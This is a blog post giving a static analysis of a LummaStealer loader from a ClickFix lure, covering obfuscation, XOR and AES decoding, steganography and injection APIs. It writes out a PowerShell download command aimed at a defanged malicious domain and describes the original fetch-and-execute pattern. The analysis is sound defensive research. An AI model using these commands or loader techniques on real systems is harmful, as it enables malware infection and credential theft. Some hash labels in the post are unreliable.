---
layout: post
title:  "LummaStealer - Static Malware Analysis"
date:   2025-06-16 21:00:00 +1000
categories: malware analysis
---

<style>
  body { font-size: 16px; }
  body {font-family: 'Inter', sans-serif}
  h1 { font-size: 19px !important; }
  h2 { font-size: 17px !important; }
  h3 { font-size: 15px !important; }
</style>

## Static LummaStealer Malware Analysis

Lumma is here too stay. This payload was from a clickfix prompt. Except rather than the standard 'paste this in windows run' it gets you to download a file and run it. Way less believable. But still hopefully some good darn malware. I'm going to dig in deep to this one and try to pull as much as I can. From the server its downloaded from to the last outbound call.

### Downloading first payload

Payload is a .cmd file that users are prompted to run to verify there identity.

MD5 Hash is : ``33a21b320c9d33e77f947862aee7cfcf825f685631f259c82cf7ae6d8db67a81``

![Stage 1](/images/cmd_vt_reputation.PNG)

Interesting. Looks like known malware. Trusty Windows Defender failed to block this, not that I expected it too.

![Stage 2](/images/cf_device.PNG)

Well, pretty straight forward. Calls powershell to reach out to a domain and run the response as code.

Lets probe this domain in a fresh sandbox and see what we can pull. We don't want to run the code. But it'd be nice to see what powershell script it returns.

So if we remove the ``| iex`` the ps1 script ret.urned won't be ran. So lets create our own .cmd file use Notepad++ with this in it ``powershell -w h -c iwr 'hXXps://evan-hartwell[.]space' -OutFile fat_old_payload.ps1``

![Stage 3](/images/second_payload_command_and_cap.PNG)

Alright, so when running the command to grab the payload I ran a pcap. As a result we know:
- IP of 'evan-hartwell[.]space > 194.15.216.208
- Lots and lots of bytes we're sent
- Connection was closed with TCP RST and ACK flags

![Stage 4](/images/ip_rep_second_payload.PNG)

We've got a pretty good network IOC here that isn't sitting behind Cloudflare. I'll come back this later and see what else we can find with it.

![Stage 6](/images/file.PNG)

So, this is our file. A healthy 4.5mbs of bits and bytes. 

Here is the MD1 hash ``3707fb795cd31deea7c4518a420a1a29`` from HashCalc. 

![Stage 6](/images/VT_ps_payload.PNG)

Red flags everywhere here with this VT report. Pretty early days which is cool. Reports are from less than 24 hours ago.

![Stage 6](/images/second_payload_code.PNG)

Alright the above is a preview of what we are dealing with. Lots and lots of crap. 219 lines of code to top it off.

Looks to be heavily obfuscated. Let's work our way through from start to finish.

First off I'm going to remove all the comments. Because they look to be nothing but a distraction? Might be wrong here but I'm going gonna do it.

### Obfuscation techniques

Multiple functions use this method, assigns a value to func. 

![Stage 7](/images/VoJH_function.PNG)

- Sets the value of VoJH to "CUAvY"
- Therefore, everytime this function is called it returns "CUAvY"

Creation of a true true statement to set a variable value

![Stage 8](/images/1st_nested_mega_func.PNG)

- Creates a true statement, to confuse. Always correct (381 = 381)
- $ofCFAQtwmREBAbV = pRgJCFouA
- $ziVemRYxAvHXzqM = kaHyyOiMg

Creation of value to null.
1. UTF-8 encoding to null
2. Creates array, iterates through it, squares each value, sets to null
3. Creates array, iterates through it, sets all values to lowercase, sets to null

![Stage 9](/images/UTF-8_encoding.PNG)
![Stage 10](/images/create_array_null.PNG)
![Stage 13](/images/to_lower.PNG)

Pointless creation and modification of arrays

1. Creates array, iterates through it, times each value by 2, sets new values to the array 'result', which is never used.
2. Creates array, iterates through it, ensures value is not greater than 255 (0xFF hex value), throws out data/result.

![Stage 11](/images/result_array.PNG)
![Stage 12](/images/band_obfuscation.PNG)

These obfuscation techniques are scattered across the .ps1 script multiple times. 

### Here is the good stuff

![Stage 13](/images/base64_strings.PNG)

Alright now we've been through all the crap. Let's have a look into these strings.

![Stage 14](/images/length_of_strings.PNG)

From the screenshot we can see that these two strings are 4.602mbs of data. That's a lot of B64. 

So we have two variables of interest ``$sOsFAVXtPZoUYex`` and ``$PWzZPneyOTwFxRA``

Let's try and decode these from B64 and see if we get any file headers/commands.

![Stage 15](/images/chef_B64.PNG)

Alright so above I've baked down some B64 with no luck on the first variable and the second. 

So I'm confident that's our string. Because if it's not there's very little bits and bytes left. 

Let's ctrl+f and see where else these magic variables pop up.

### And some more good stuff

Alright bingo. Looks like we have an XOR function that uses ``$sOsFAVXtPZoUYex`` and ``$PWzZPneyOTwFxRA``

![Stage 16](/images/xor_function.PNG)

Ok bit to unpack here. So I'll explain what everything we are seeing is individually
- ``$PWzZPneyOTwFxRA`` --> Our string (variable)
- ``$sOsFAVXtPZoUYex`` --> Key used for XOR (variable)
- ``bxor`` --> bitwise XOR in PS

So we have a for loop sifting through each byte in our string ``$PWzZPneyOTwFxRA``
- For each byte in the string we are applying the corresponding XOR key from the variable ``$sOsFAVXtPZoUYex``
- The result is then stored back into the string variable ``$PWzZPneyOTwFxRA``

Hypothetically, if no other funny business is going on further down the code we should have our payload! Decoded and ready to inspect.

### Run this in memory?

Well this is interesting.

![Stage 17](/images/loads_in_memory.PNG)

Let's break down what this does. We can see our magic payload variable as well.
- Sets the value of ``$djiOPViLVyuSVPv`` to our magic payload 
- Creates the variable that uses System.Reflection.Assembly.Load() to load each byte of ``$djiOPViLVyuSVPv`` to memory. 
- Sets the value of ``$qzBoWfMkoCHlDBv`` as the entry point method for Main ``$qzBoWfMkoCHlDBv = $cOABfBZeRSopDLe.EntryPoint``
- Loads it in memory!

### Lets print this string

Alright we know the variable ``$PWzZPneyOTwFxRA`` stores the unencoded string. So lets do up a powershell script that prints this value after decoded using the process above to a .txt file. 

This is a safe way of pulling the string, without actually executing it.

Here's the script I've spun up to do this.

![Stage 18](/images/writing_payload_to_bin.PNG)

Let's run it. Alright we've created a file, 1.6mbs. Let's save it as a .exe and whack it into PE Studio for a first glance look.

### Stub has been found

Alright, this is odd. Hash doesn't have a rep. Perhaps the key is unique for each stub? Looks like we are dealing with a polymorphic stub.

![Stage 19](/images/PE_studio_details.PNG)

### Is the packer/packing method known?

I knew of Detect It Easy but I thought it just showed what type of file it is. But no, it shows a lot more. 

![Stage 30](/images/detect_it_easy.PNG)

What we know so far
- Unrecognisable hash
- WeavePron (Lumma IOC)
- MZ header (.exe/dll)
- Compiled in the future (Aug 10th - 2040) (Russian time machine)
- .NET modules
- Strange Entry Point (EP)
- High entropy (Highly likely packed)

### DNspy analysis

From what we've observed above we can see it's compiled using .NET. Therefore, DNspy is the only viable option for a lvl 0 analyst with no clue what they're doing.

![Stage 19](/images/type_refs_dnspy.PNG)

Off the bat we can see some pretty interesting type references being called. Bitmap (Steganography?) and AES (Encrypted payloads/commands?).

This looks complicated. And tbh, way past me. But I'll try. 

One resource at a time. I have come back and renamed functions/classes/variables to make it easier for you guys to follow.

### First resource - encryption

Looks to be encryption related. I'm naming it 'Encryption'

![Stage 20](/images/AES_decrypted_payload.PNG)

``function hyWrUMaZEjThtdcTaJXxhVvuTHvVzeUkHMPTBQkcOgNUuYSzXkFBZvPlcBynqeAAoJzGoir``

Pivoting to our block of code we can see an AES decryption function.
- Passes in a string, key and IV variable
- Checks passed in values aren't empty
- Sets the value of ``bytes`` to the byte value of the passed in 'key' value from earlier
- Sets the value of ``bytes2`` to the byte value of the passed in 'IV' value from earlier
- Creates AES function called ``aes``
- Performs decryption in memory using ``MemoryStream`` and ``CryptoStream`` .NET functions
- Writes output to the variable ``result``

Alright. So this is cool. Looks to be the function that is called when AES encryption is done. 

Let's rename this function 'AES'.

For my own sanity. This is how the function is called and what each parameter means.

``public static byte[] AES(byte[] encryptedData, string key, string iv)``

Looking below it we have another function. 

![Stage 20](/images/base64_dnspy_encrypted.PNG)

``function PBOIcRvxVgYlMZNdvxrPQABHzOhjKOTBkLIDtqyaUDWhujlVQXpZmEIoagjnKmMgnwaarkK``

This calls our renamed function from earlier 'AES'. It's so much easier to read when the function name isn't 100 characters of crap.

Anyway, this is my understanding of what this function does.
- Checks if the string passed in is empty
- Converts from B64 to bytes
- Calls our AES function above
- The key being (iyqxPznqJeKphyFCVAsbdLKdKwyLINQAedGsTfZoboqLCVOZrwnbutLwNnNtaBHWnjleSnJQBdZOvZBOHzumAPgKrjEGsGoAGuxs)
- The IV being (KKgdNwAquXbNLYLAguvydANIIcyUPyhbCidXsqzdoQquiQUtUOtmYZpkXxvKYFAVPalCVOhPVrkmjsASieZbfVcDTTZVVPeIpvEi)
- Then converts bytes to a string!

Let's rename this 'B64_to_AES' for again, our own sanity. 

### Second resource - steganography in memory

No idea what's going on here. We have three functions in this class.

![Stage 21](/images/second_resource.PNG)

I can see a class called ``vCcvlnogkpPqFkIzeiMnjOpsdiIRbGFkLbYcnCcnyqXchFAaHKJOIvMGmJsdFweDKEFEmGmCfyPTRnlxIHkrXRBporPDkZIbltsCZWObygIkFTPZyUuYmNGS`` lets follow this.

![Stage 22](/images/2nd_resource_first_func.PNG)

This function ``dppVRIsgQOHxUIyMTjTQjrKvBPfqEJOxMzzKGSjPOBuRlrfPwIfdUPJMFTtcCcCgZkKvjNf`` looks to pass a string as a parameter.

Let's break down what this does
- Embeds a filename/resource into assembly
- Returns it as a stream
- Copies stream into memory
- Returns raw byte array of the resource

Lets rename this function to 'Load_resource_to_memory_stream'

![Stage 23](/images/2nd_resource_second_func.PNG)

Next function is ``WnbGVEQzromcRKpVvOKWCnhWuLKvQFCIxwIfLYyomIHWrkjNdkqMVuaIgelkTvJMMDEuckk``

Bitmap, looks like we found our steganography.

This function passes in a string as a parameter. 

Let's break down what this does
- Treats string as an image
- Loops over each pixel 
- Only reads the red channel bytes
- Applies this transformation to each byte in the array ``array[num2] = (byte.MaxValue - bitmap.GetPixel(j, i).R ^ 114)``
- Returns byte array

![Stage 24](/images/2nd_resource_third_func.PNG)

Last function looks to put it all together. 
- Loads resource using ``Load_resource_to_memory_stream()``
- Decrypts using ``AES()`` from the first resource
- Extracts commands from image 
- Executes commands

Our final function calls to classes that I haven't looked at yet. So let's start there
- ``dsTKoRZrSCMHaqaqbrjLRpevwciJTkEJldwlTVdXssKaKVGsepxkVZDNoxnlJpyIYdvXUOwgolsyFdLBwPEDMuNmAIXwHRocUccHzJypSrVKGfhkMMOTLUVD``
- ``cfrsElTFobOrxEKNrfrdyqSAWVHNWqJteURcnqoezGDvQPPzltgwUwZMmQvIDfJXsvmCMHzaRnDRMwKhgiCCknyIVfQxVFAuXFdvCmMEUfEHShZQgoCvDgNe``

### Third resource - static constructor

Ok we are getting closer to the goods. This resource gives us some great info.

There is one function is this resource

![Stage 25](/images/third_resource.PNG)

Alright this isn't too hard to understand I'll run through it
- Converts two strings from B64 to UTF-8.
- Decoded these are "884f9fccc3fc4778" and "4bbe3beb9ee24f58" (Our AES Key and IV!)
- Decodes string using our B64_to_AES function from earlier. Passing in our key and IV above. x2
- Outputs to byte array x2

This is what the flow looks like B64 --> AES Decrypt --> Result stored in ``decrypted_byte_array1`` and ``decrypted_byte_array2``

So lets take a peep inside these variables? Why the fudge not. When I whip these up in Cyberchef I get this.

- ``decrypted_byte_array1`` = 14d248e6dc0641dd817e1592523450df
- ``decrypted_byte_array2`` = "C:\\Windows\\SysWOW64\\explorer.exe"

First variable looks to be a hex string, maybe a key for later?

Second variable is 'explorer.exe' path! Hell yea. We've got a good file IOC now. Maybe injection path. Not sure yet.

### Fourth resource - 

Class is ``cfrsElTFobOrxEKNrfrdyqSAWVHNWqJteURcnqoezGDvQPPzltgwUwZMmQvIDfJXsvmCMHzaRnDRMwKhgiCCknyIVfQxVFAuXFdvCmMEUfEHShZQgoCvDgNe``

Here we go, I can smell the roses already. Big old string. This looks promising

![Stage 26](/images/fourth_resource.PNG)

Our function we will be trying to understand is ``WEHHRcflMjThsoETvYIeIRPNgZrGdfQRSYyYFfMRZtUIoSxRJJZFyIwfPTARLyiHtcotQGn``

Oh wow. Towards the end of the functon it looks to pass in the same key and IV from earlier. This is looking good.

Let's decode this string with CyberChef real quick.

![Stage 27](/images/cyberchef_decode.PNG)

Bingo. Let's whack this output into an IDE and get a better look at it.

I've got 200+ lines of code here. Process injection looks to be.

![Stage 28](/images/dll_injection.PNG)

Calls these APIs
- CreateProcess
- VirtualAllocEx	
- WriteProcessMemory	
- CreateRemoteThread
- WaitForSingleObject	
- TerminateProcess
- CloseHandle

Has reference to two interesting variables in the code ``bytes`` and ``path``.
- I'd assume that ``path`` would be our explorer.exe path from before
- ``Bytes`` could be the payload?

Let's search for ``bytes`` first because, that will probably be juicier.

But first. We have to figure out what the second part of this class does.

![Stage 29](/images/fourth_resource_2nd.PNG)

Alright, I stupidly didn't save this. So all my DNSpy work has been deleted. 